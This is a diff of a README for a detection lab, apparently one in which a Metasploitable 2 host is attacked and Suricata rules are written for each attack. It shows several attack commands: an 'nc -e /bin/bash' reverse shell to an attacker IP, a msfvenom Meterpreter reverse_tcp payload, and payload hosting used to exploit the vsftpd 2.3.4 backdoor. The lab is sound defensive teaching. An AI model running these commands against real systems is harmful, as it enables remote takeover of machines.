@@ -84,7 +84,7 @@ The system was configured, booted and logged into. Given that Metasploitable 2 i
 ## Methodology - Attacking and Detecting:
 
 To monitor the communication between the attacker and the victim for each attack, tcpdump was initiated on the Suricata server using this command:<br>
-```sudo tcpdump -i <interface> -vvv -nn "host 192.168.134 > foo.txt```<br>
+```sudo tcpdump -i <interface> -vvv -nn "host 192.168.134 > <exercise name>.txt```<br>
 Thereafter, an attack was launched and once completed, the packet analysis was stopped and the contents examined for patterns that could address each challenge.
 
 ### Stealth Scan
@@ -159,11 +159,11 @@ This rule detects attempts to add a user by executing an echo command to modify 
 
 ### Metasploit Reverse Shell - Leveraging the VSFTPD 2.3.4 vulnerability
 
-A Metasploit reverse shell enables an attacker to execute commands on a compromised system by having the target initiate an outbound connection to the attacker's machine, effectively bypassing firewalls and NAT restrictions. A vulnerability like vsftpd 2.3.4 can be exploited by injecting a backdoor, which spawns an interactive shell with elevated privileges, and used to create a more stable shell initiated from the victim. This reverse connection grants the attacker full control over the system, with little risk of detection, as outbound connections are typically trusted by firewalls and other security defenses.
+A Metasploit reverse shell enables an attacker to execute commands on a compromised system by having the target initiate an outbound connection to the attacker's machine, effectively bypassing firewalls and NAT restrictions. A vulnerability like vsftpd 2.3.4 can be exploited by triggering a backdoor, which spawns an interactive shell with elevated privileges. This can then be used to create a more stable shell initiated from the victim. This reverse connection grants the attacker full control over the system, with little risk of detection, as outbound connections are typically trusted by firewalls and other security defenses.
 
 Challenge: _Develop a Suricata rule to detect Metasploit reverse shell connections by monitoring for outbound TCP connections to known attacker IP addresses._
 
-Metasploit Framework was launched using ```msfconsole``` on the attacker. Using the service versions obtained earlier, an exploit for the VSFTPD 2.3.4 module was found and run using the following sequence of commands:<br>
+Metasploit Framework was launched using ```msfconsole``` on the attacker. Using the service versions obtained earlier, an exploit for the VSFTPD 2.3.4 module was found, set up and run using the following sequence of commands:<br>
 
 <img src="https://github.com/Keamo-getswe/artefact-repo/blob/main/vsftpd-search.png?raw=true)">
 <img src="https://github.com/Keamo-getswe/artefact-repo/blob/main/vsftpd-settings.png?raw=true">
@@ -173,7 +173,7 @@ Note that once the vulnerability was exploited and a bind shell was spawned, the
 
 This command listened for connections on port 17000. Thereafter, in the spawned shell, the following was executed to connect another shell session to the attacker:<br>
 ```nc -e /bin/bash 192.168.8.134 17000```<br>
-Below are the commands used to listen for this reverse shell connection and some commands to setup better utility of the shell (typical when improving the quality of the shell to allow easier use):
+Below is the command used to listen for this reverse shell connection, the output showing successful connection and some commands to setup better utility of the reverse shell:
 
 <img src="https://github.com/Keamo-getswe/artefact-repo/blob/main/attacker-reverse-shell.png?raw=true">
 
@@ -185,22 +185,22 @@ This rule alerts when an internal host, such as the Metasploitable victim, estab
 
 ### Metasploit Meterpreter Communication - Upgrading the VSFTPD 2.3.4 shell
 
-Meterpreter is a powerful, dynamic payload within Metasploit with brief command syntax that offers high-level functionality. This can streamline attacks and enhance ease of use by allowing attackers to efficiently perform tasks like system exploration, privilege escalation, and persistence. A vulnerability like vsftpd 2.3.4 can be exploited to inject a backdoor that opens a bind shell, which the attacker can then connect to and upgrade to a Meterpreter session for more robust control, including stealthy operations and evasion of detection. The risks of such an attack include data theft, further compromise, and long-term control of the targeted system.
+Meterpreter is a powerful, dynamic payload within Metasploit that provides an interactive shell and supports concise commands. This can streamline attacks and enhance ease of use by allowing attackers to efficiently perform complex tasks like system exploration, privilege escalation, and persistence. The vsftpd 2.3.4 exploit can be exploited to open a bind shell, which the attacker can then upgrade to a Meterpreter shell for more robust control, including stealthy operations and evasion of detection. The risks of such an attack include data theft, further compromise, and long-term control of the targeted system.
 
 Challenge: _Create a Suricata rule to detect Meterpreter communication activities by analyzing HTTP or TCP traffic with characteristic Meterpreter payloads._
 
-Metasploit Framework was launched using ```msfconsole``` on the attacker. Using the service versions obtained earlier, an exploit for the VSFTPD 2.3.4 module was found and run using the following sequence of commands:<br>
+Metasploit Framework was launched using ```msfconsole``` on the attacker. Using the service versions obtained earlier, an exploit for the VSFTPD 2.3.4 module was found, set up and run using the following sequence of commands:<br>
 
 <img src="https://github.com/Keamo-getswe/artefact-repo/blob/main/vsftpd-search.png?raw=true)">
 <img src="https://github.com/Keamo-getswe/artefact-repo/blob/main/vsftpd-settings.png?raw=true">
 
-Having spawned the bind shell from this exploit, the Meterpreter payload was generated using msfvenom in a separate terminal session:<br>
+The Meterpreter payload was then generated using msfvenom in a separate terminal:<br>
 ```msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=192.168.8.134 LPORT=87 -f elf > meter.elf```<br>
 
-The attacker then hosted the payload on a Python web server in yet another separate terminal session:<br>
+The attacker then hosted the payload on a Python web server in another terminal:<br>
 ```python3 -m http.server 8080```<br>
 
-The attacker then downloaded the payload on the victim machine via the bind shell, set the executable permissions, navigated to the payload's folder and then checked the permisions on the file. Finally, the bind shell session was then put into the background by typing the "background" command and choosing "y" when prompted:<br>
+The attacker then downloaded the payload on the victim machine via the bind shell, set the executable permissions, navigated to the payload's folder and then checked the permisions on the file. Finally, the bind shell session was put into the background:<br>
 
 <img src="https://github.com/Keamo-getswe/artefact-repo/blob/main/meterpreter-download-setup.png">
 
